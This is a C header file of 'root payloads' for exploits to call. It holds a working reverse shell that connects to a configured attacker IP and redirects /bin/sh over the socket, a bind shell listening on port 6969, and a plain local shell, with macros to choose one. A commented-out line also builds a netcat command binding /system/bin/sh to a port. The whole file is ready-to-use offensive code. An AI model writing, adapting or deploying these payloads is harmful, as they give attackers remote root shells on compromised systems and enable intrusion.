#ifndef ROOT_PAYLOAD_H
#define ROOT_PAYLOAD_H

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <arpa/inet.h>
#include <sys/socket.h>

#ifndef ROOT_PAYLOAD_PORT
#define ROOT_PAYLOAD_PORT 6969
#endif

// Provides various different root payloads for exploits to use

static void reverse_shell(const char *ip, unsigned short port) {
  int sock;
	struct sockaddr_in target;

	// Create the socket
	sock = socket(AF_INET, SOCK_STREAM, 0);
	if (sock < 0) {
		perror("socket");
		exit(1);
	}

	// Configure the target address
	target.sin_family = AF_INET;
	target.sin_port = htons(port);  // Port 4444
	inet_pton(AF_INET, ip, &target.sin_addr);  // IP address

	// Connect to the target
	if (connect(sock, (struct sockaddr *)&target, sizeof(target)) < 0) {
		perror("connect");
		exit(1);
	}

	// Redirect stdin, stdout, stderr to the socket
	dup2(sock, 0);
	dup2(sock, 1);
	dup2(sock, 2);

	// Spawn the shell
	execl("/bin/sh", "sh", NULL);
}

static void listening_shell(unsigned short port) {
  int server_fd, client_fd;
  struct sockaddr_in address;
  socklen_t addrlen = sizeof(address);

  // 1. Create socket
  if ((server_fd = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
    sleep(10);
    perror("socket failed");
    exit(EXIT_FAILURE);
  }

  // 2. Set address options
  int opt = 1;
  if (setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt)) == -1) {
    sleep(10);
    perror("setsockopt failed");
    close(server_fd);
    exit(EXIT_FAILURE);
  }

  // 3. Bind socket to a port
  memset(&address, 0, sizeof(address));
  address.sin_family = AF_INET;
  address.sin_addr.s_addr = INADDR_ANY;  // listen on all interfaces
  address.sin_port = htons(port);

  if (bind(server_fd, (struct sockaddr *)&address, sizeof(address)) == -1) {
    sleep(10);
    perror("bind failed");
    close(server_fd);
    exit(EXIT_FAILURE);
  }

  // 4. Listen for incoming connections
  if (listen(server_fd, 1) == -1) {
    sleep(10);
    perror("listen failed");
    close(server_fd);
    exit(EXIT_FAILURE);
  }

  printf("Listening on port %d...\n", port);

  // 5. Accept a single connection
  if ((client_fd = accept(server_fd, (struct sockaddr *)&address, &addrlen)) == -1) {
    sleep(10);
    perror("accept failed");
    close(server_fd);
    exit(EXIT_FAILURE);
  }

  close(server_fd);

  dup2(client_fd, 0);
  dup2(client_fd, 1);
  dup2(client_fd, 2);

  execl("/bin/sh", "sh", NULL);

  sleep(10);

  // char buf[128] = { 0 };
  // snprintf(buf, sizeof(buf), "nc -s 127.0.0.1 -p %hu -L /system/bin/sh -l", port);

  // system(buf);
}

static void shell() {
	execlp("/bin/sh","/bin/sh",NULL);
}

// executes the correct root payload based on what exploit is configured for
static void root_payload() {
#ifdef REVERSE_SHELL
  reverse_shell(ROOT_PAYLOAD_IP, ROOT_PAYLOAD_PORT);
#elif LISTENING_SHELL
  listening_shell(ROOT_PAYLOAD_PORT);
#else
  shell();
#endif
}

#endif
